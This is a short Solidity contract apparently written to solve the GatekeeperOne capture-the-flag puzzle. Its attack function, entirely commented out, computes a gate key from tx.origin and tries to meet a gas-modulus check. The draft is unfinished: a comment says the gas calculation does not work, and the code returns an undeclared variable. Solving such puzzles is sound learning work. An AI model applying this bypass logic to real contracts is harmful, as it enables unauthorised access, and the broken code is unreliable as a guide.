pragma solidity 0.8.4;
import "hardhat/console.sol";

interface GateKeeperOneInterface{
    function enter(bytes8 _gateKey) external returns (bool);
    function entrant() external view returns(address);
}

contract GateKeeperOneExploit{
    // Variables & Declarations
	address gateKeeperOneAddr;

	// Constructor
	constructor(address _addr) public{
		gateKeeperOneAddr = _addr;
	}

	// Methods

    // function attack(uint256 _gasAmount) public returns (uint256){
    //     // Access to Target Contract
    //     GateKeeperOneInterface gi = GateKeeperOneInterface(gateKeeperOneAddr);

    //     // Calculate the gateKey
    //     bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

    //     // Calculate the Required Gas for the gateTwo Modifier (Does Not Work)
    //     uint256 gasAmount = block.gaslimit - (gasleft() % 8191); // block.gaslimit - (gasLeft.mod(8191))

    //     // Send that Amount
    //     // bool result = gi.enter{gas: _gasAmount}(_gateKey);
    //     return remainingGas;
    // }
}